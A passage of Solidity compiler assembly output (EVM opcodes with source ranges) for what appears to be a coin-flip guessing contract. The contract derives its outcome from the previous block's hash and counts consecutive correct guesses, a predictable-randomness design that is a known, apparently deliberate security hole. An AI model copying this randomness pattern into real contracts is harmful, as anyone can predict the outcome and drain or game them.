											"begin": 525,
											"end": 978,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 525,
											"end": 978,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 309,
											"end": 339,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 309,
											"end": 339,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 309,
											"end": 339,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 309,
											"end": 339,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 309,
											"end": 339,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 309,
											"end": 339,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 309,
											"end": 339,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 309,
											"end": 339,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 309,
											"end": 339,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 309,
											"end": 339,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 309,
											"end": 339,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 309,
											"end": 339,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 309,
											"end": 339,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 309,
											"end": 339,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 309,
											"end": 339,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 309,
											"end": 339,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 309,
											"end": 339,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 309,
											"end": 339,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 309,
											"end": 339,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 309,
											"end": 339,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 309,
											"end": 339,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 309,
											"end": 339,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 309,
											"end": 339,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 309,
											"end": 339,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 309,
											"end": 339,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 525,
											"end": 978,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 568,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 581,
											"end": 599,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 620,
											"end": 639,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 637,
											"end": 638,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 620,
											"end": 632,
											"name": "NUMBER",
											"source": 0
										},
										{
											"begin": 620,
											"end": 636,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 620,
											"end": 636,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 620,
											"end": 639,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 620,
											"end": 639,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 620,
											"end": 639,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 620,
											"end": 639,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 620,
											"end": 639,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 620,
											"end": 639,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 620,
											"end": 639,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 610,
											"end": 640,
											"name": "BLOCKHASH",
											"source": 0
										},
										{
											"begin": 602,
											"end": 641,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 602,
											"end": 641,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 581,
											"end": 641,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 581,
											"end": 641,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 666,
											"end": 676,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 654,
											"end": 662,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 654,
											"end": 662,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 654,
											"end": 676,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 650,
											"end": 703,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 650,
											"end": 703,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 650,
											"end": 703,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 687,
											"end": 695,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 687,
											"end": 695,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 687,
											"end": 695,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 650,
											"end": 703,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 650,
											"end": 703,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 722,
											"end": 732,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 711,
											"end": 719,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 711,
											"end": 732,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 711,
											"end": 732,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 711,
											"end": 732,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 711,
											"end": 732,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 739,
											"end": 755,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 758,
											"end": 780,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 773,
											"end": 779,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 773,
											"end": 779,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 758,
											"end": 768,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 758,
											"end": 772,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 758,
											"end": 772,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 758,
											"end": 780,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 758,
											"end": 780,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 758,
											"end": 780,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 758,
											"end": 780,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 758,
											"end": 780,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 758,
											"end": 780,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 758,
											"end": 780,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 739,
											"end": 780,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 739,
											"end": 780,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 787,
											"end": 796,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 811,
											"end": 812,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 799,
											"end": 807,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 799,
											"end": 812,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 799,
											"end": 827,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 799,
											"end": 827,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 822,
											"end": 827,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 799,
											"end": 827,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 799,
											"end": 827,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 799,
											"end": 827,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 799,
											"end": 827,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 815,
											"end": 819,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 799,
											"end": 827,
											"name": "tag",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 799,
											"end": 827,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 787,
											"end": 827,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 787,
											"end": 827,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 848,
											"end": 854,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 840,
											"end": 854,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 840,
											"end": 854,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 840,
											"end": 844,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 840,
											"end": 854,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 840,
											"end": 854,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 840,
											"end": 854,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 836,
											"end": 973,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 836,
											"end": 973,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 836,
											"end": 973,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 865,
											"end": 880,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 865,
											"end": 880,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 865,
											"end": 882,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 865,
											"end": 882,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 865,
											"end": 882,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 865,
											"end": 882,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 865,
											"end": 882,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 865,
											"end": 882,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 865,
											"end": 882,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 865,
											"end": 882,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 865,
											"end": 882,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 865,
											"end": 882,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 865,
											"end": 882,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 865,
											"end": 882,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 865,
											"end": 882,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 898,
											"end": 902,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 891,
											"end": 902,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 891,
											"end": 902,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 891,
											"end": 902,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 891,
											"end": 902,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 891,
											"end": 902,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 891,
											"end": 902,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 891,
											"end": 902,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 836,
											"end": 973,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 836,
											"end": 973,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 943,
											"end": 944,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 925,
											"end": 940,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 925,
											"end": 944,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 925,
											"end": 944,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 925,
											"end": 944,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 925,
											"end": 944,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 960,
											"end": 965,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 953,
											"end": 965,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 953,
											"end": 965,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 953,
											"end": 965,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 953,
											"end": 965,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 953,
											"end": 965,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 525,
											"end": 978,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 525,
											"end": 978,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 309,
											"end": 339,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 309,
											"end": 339,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 309,
											"end": 339,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 309,
											"end": 339,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 309,
											"end": 339,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 309,
											"end": 339,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 1274,
											"end": 1408,
											"name": "tag",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 1274,
											"end": 1408,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1332,
											"end": 1339,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 1362,
											"end": 1363,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1365,
											"end": 1366,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "PUSH",
											"source": 1,
											"value": "1E"
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "PUSH",
											"source": 1,
											"value": "536166654D6174683A207375627472616374696F6E206F766572666C6F770000"
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1358,
											"end": 1361,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "tag",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 1358,
											"end": 1401,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1401,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1351,
											"end": 1401,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1274,
											"end": 1408,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1274,
											"end": 1408,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1274,
											"end": 1408,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1274,
											"end": 1408,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1274,
											"end": 1408,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 3033,
											"end": 3163,
											"name": "tag",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 3033,
											"end": 3163,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3091,
											"end": 3098,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 3121,
											"end": 3122,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3124,
											"end": 3125,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "PUSH",
											"source": 1,
											"value": "1A"
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "PUSH",
											"source": 1,
											"value": "536166654D6174683A206469766973696F6E206279207A65726F000000000000"
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3117,
											"end": 3120,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "tag",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 3117,
											"end": 3156,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3110,
											"end": 3156,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 3110,
											"end": 3156,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3033,
											"end": 3163,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 3033,
											"end": 3163,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 3033,
											"end": 3163,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3033,
											"end": 3163,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 3033,
											"end": 3163,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1692,
											"end": 1879,
											"name": "tag",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 1692,
											"end": 1879,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1778,
											"end": 1785,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1810,
											"end": 1811,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1805,
											"end": 1806,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1805,
											"end": 1811,
											"name": "GT",
											"source": 1
										},
										{
											"begin": 1805,
											"end": 1811,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1813,
											"end": 1825,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "tag",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "tag",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "1F"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1797,
											"end": 1826,
											"name": "PUSH",
											"source": 1,
											"value": "100"
